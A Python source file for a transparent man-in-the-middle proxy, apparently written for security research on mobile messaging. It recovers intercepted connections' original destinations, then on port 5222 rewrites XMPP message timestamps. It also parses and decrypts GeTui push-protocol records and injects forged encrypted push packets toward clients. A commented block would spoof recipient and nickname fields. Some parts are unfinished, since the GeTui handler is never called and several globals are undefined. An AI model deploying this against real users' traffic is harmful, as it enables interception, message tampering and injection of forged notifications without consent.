import socket, SocketServer
import subprocess, select, struct
import traceback
import xml.etree.ElementTree as ET
from xml.etree.ElementTree import XML, fromstring, tostring
from inspect import getmembers
from pprint import pprint

from scapy.packet import Packet, bind_layers
from scapy.fields import *
from scapy.layers.inet import TCP
from dec import *
from scapy.all import *
import collections, json

SO_ORIGINAL_DST = 80



def lookup(address, port, s):
    spec = "%s:%s" % (address, port)
    for i in s.split("\n"):
        if "ESTABLISHED:ESTABLISHED" in i and spec in i:
            s = i.split()
            if len(s) > 4:
                if sys.platform == "freebsd10":
                    s = s[3][1:-1].split(":")
                else:
                    s = s[4].split(":")

                if len(s) == 2:
                    return s[0], int(s[1])
    raise RuntimeError("Could not resolve original destination.")

def get_original_addr(csock):
    output = subprocess.check_output("uname")
    if not output.strip() == "Linux":
        address, port = csock.getpeername()
        s = subprocess.check_output(("sudo", "-n", "/sbin/pfctl", "-s", "state"), stderr=subprocess.STDOUT)
        return lookup(address, port, s)
    odestdata = csock.getsockopt(socket.SOL_IP, SO_ORIGINAL_DST, 16)
    _, port, a1, a2, a3, a4 = struct.unpack("!HHBBBBxxxxxxxx", odestdata)
    address = "%d.%d.%d.%d" % (a1, a2, a3, a4)
    return address, port


def recv_one(ssock, csock):
    readable = select.select([ssock, csock],[],[],30)[0]
    datalist = []
    for r in readable:
        try:
            data = r.recv(2048)
            datalist.append((r, data))
        except Exception,e:
            #traceback.print_exc()
            if e.errno == 54:
                csock.close()
                ssock.close()
                return
    return datalist

class GTRecord(Packet):
    name = "GeTui Record"
    fields_desc = [
            StrFixedLenField("head", 0x73ea68fb, 0x04),
            ByteField("len1", 0x14),
            ByteField('cons', 0x05),
            ByteField('e', ""),
            ByteField('b', ""),
            FieldLenField('len2', 0x10, length_of='key', fmt='B'),
            StrLenField('key', '', length_from=lambda x:x.len2),
            FieldLenField('length', None, length_of='data', fmt='>H'),
            ByteField('c',''),
            StrLenField('data', '', length_from=lambda x:x.length),
            ]

class GTPayload(Packet):
    name = "GeTui MessagePush Payload"
    fields_desc = [

            ShortField("a", ""),
            ByteField("b", ""),
            IntField("time1", ""),
            IntField("time2", ""),
            FieldLenField("len", "", length_of='d', fmt='B'),
            StrLenField('d', '', length_from=lambda x:x.len),
            FieldLenField("len1", "", length_of='payload1', fmt='B'),
            ConditionalField(FieldLenField("len2", "", length_of='payload1', fmt='B'), lambda x:x.len1&128!=0),
            StrLenField("payload1", "", length_from=lambda x:((x.len1&127)<<7)|x.len2),
            FieldLenField("len3", "", length_of='payload2', fmt='B'),
            ConditionalField(FieldLenField("len4", "", length_of='payload2', fmt='B'), lambda x:x.len3&128!=0),
            #ConditionalField(StrLenField("payload2", "", length_from=lambda x:((x.len3&127)<<7) if x.len4 is None else ((x.len3&127)<<7)|x.len4), lambda x:x.len3&127!=0),
            ConditionalField(StrLenField("payload2", "", length_from=lambda x:x.len3 if x.len4 is None else ((x.len3&127)<<7)|x.len4), lambda x:x.len3&127!=0),
            FieldLenField("len5", "", length_of='payload3', fmt='B'),
            StrLenField("payload3", "", length_from=lambda x:x.len5),

            ]


class ServerHandler(SocketServer.BaseRequestHandler):
    def xmpp(self, data, readable, csock, ssock):
        print "ORI", data
        if readable == csock:
            # if data.find("from") != -1:
            #     char = 'to'
            #     chlen = len(char)+2
            #     repstr = "1222719705@sns"

            #     pos = data.find(char)
            #     pos2 = data[pos+chlen:].find('"')
            #     data = data[:pos+chlen]+repstr+data[pos+chlen+pos2:]
            #     '''

            #     char = 'nickname'
            #     chlen = len(char)+3
            #     repstr = "EverMars"

            #     pos = data.find(char)
            #     pos2 = data[pos+chlen:].find('"')
            #     data = data[:pos+chlen]+repstr+data[pos+chlen+pos2:]
            #     '''
            #     print "REP", data
            try:
                tree = ET.ElementTree(ET.fromstring(data))
                root = tree.getroot()

                root.set('date','100000000000')
                for message in root.findall('message'): 
                    message.set('date','100000000000')

                data = ET.tostring(root, encoding='utf-8')
                print "REP", data
            except Exception,e:
                    traceback.print_exc()
            
            ssock.sendall(data)
        else:
            csock.sendall(data)
    def getui(self, data, readable, csock, ssock):
        global f_inject
        global injpkt1
        global injpkt2
        #print 'OriData', data.encode('hex')
        p = GTRecord(data)
        flag, res = decrypt(p.data, p.key) #flag stands for gzip
        if readable == csock:
            if res != '':
                print 'Send', repr(res)
            ssock.sendall(str(p))
        else:
            if res != '':
                print 'Recv', repr(res)
                if f_inject == True:
                    csock.sendall(str(p))
                    injpkt=injpkt1+gettime()+injpkt2
                    p.data=encrypt(injpkt, p.key, True)
                    print 'REcv', repr(injpkt)

                    f_inject = False
                elif flag == True: #change url
                    q = GTPayload(res)
                    orilen = len(q.payload1)

                    p.data = encrypt(str(q), p.key, flag)
                    p.length = len(p.data)
            csock.sendall(str(p))


    def handle(self):
        csock = self.request
        sip, sport = csock.getpeername()
        ip, port = get_original_addr(csock)
        ssock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ssock.connect((ip, port))
        if(port == 5222):
            print "('%s', %s(%s)) Connecting ('%s', %s)"%(sip, sport, hex(sport).upper(), ip, port)
            while 1:
                try:
                    datalist = recv_one(csock, ssock)
                    if datalist is None:
                        return
                    for readable, data in datalist:
                        if data is None or data == "":
                            return
                        #print "###############begin###############"
                        #print data
                        #print "################end################"
                        self.xmpp(data, readable, csock, ssock)

                except Exception,e:
                    traceback.print_exc()
                    break
        else:
            while 1:
                try:
                    datalist = recv_one(csock, ssock)
                    if datalist is None:
                        return
                    for readable, data in datalist:
                        if readable == csock:
                            ssock.sendall(data)
                        else:
                            csock.sendall(data)
                            
                except Exception,e:
                    traceback.print_exc()
                    break

class ThreadedServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
    pass

if __name__ == "__main__":
    ThreadedServer.allow_reuse_address = True
    ThreadedServer(('',8888), ServerHandler).serve_forever()
